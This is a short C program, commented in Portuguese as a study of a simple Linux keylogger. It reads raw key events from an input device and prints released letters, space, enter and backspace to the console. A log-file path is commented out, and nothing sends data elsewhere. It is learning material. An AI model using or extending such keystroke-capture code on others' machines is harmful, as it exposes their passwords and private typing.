/*
Estudo da implementacao de um simples keylogger para sistema linux.
Este estudo esta baseado em dois videos no Youtube.
Videos:
https://www.youtube.com/watch?v=b_dP5lOLI4E
https://www.youtube.com/watch?v=M3MNoPPp0pU
*/
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include </usr/include/linux/input.h>
#include <sys/stat.h>

/*struct input_event {
    struct timeval time;
    __u16 type;
    __u16 code;
    __s32 value;
};*/

//#define LOGFILE "/tmp/data"
#define DEVICE "/dev/input/event7"

int main() {
    struct input_event event;
    int keyboard = open(DEVICE, O_RDONLY);
//    FILE *log = fopen(LOGFILE, "a");
//    char *map = "...1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";

    while (1) {
        read(keyboard, &event, sizeof(event));
        fflush(stdout);

        if (event.type == EV_KEY && event.value == 0) {
            switch (event.code) {
                case KEY_A: printf("A"); break;
                case KEY_B: printf("B"); break;
                case KEY_C: printf("C"); break;
                case KEY_D: printf("D"); break;
                case KEY_E: printf("E"); break;
                case KEY_F: printf("F"); break;
                case KEY_G: printf("G"); break;
                case KEY_H: printf("H"); break;
                case KEY_I: printf("I"); break;
                case KEY_J: printf("J"); break;
                case KEY_K: printf("K"); break;
                case KEY_L: printf("L"); break;
                case KEY_M: printf("M"); break;
                case KEY_N: printf("N"); break;
                case KEY_O: printf("O"); break;
                case KEY_P: printf("P"); break;
                case KEY_Q: printf("Q"); break;
                case KEY_R: printf("R"); break;
                case KEY_S: printf("S"); break;
                case KEY_T: printf("T"); break;
                case KEY_U: printf("U"); break;
                case KEY_V: printf("V"); break;
                case KEY_W: printf("W"); break;
                case KEY_X: printf("X"); break;
                case KEY_Y: printf("Y"); break;
                case KEY_Z: printf("Z"); break;
                case KEY_SPACE: printf(" "); break;
                case KEY_ENTER: printf("\n"); break;
                case KEY_BACKSPACE: printf("[BACKSPACE]"); break;
            }
        }
    }

    return 0;
}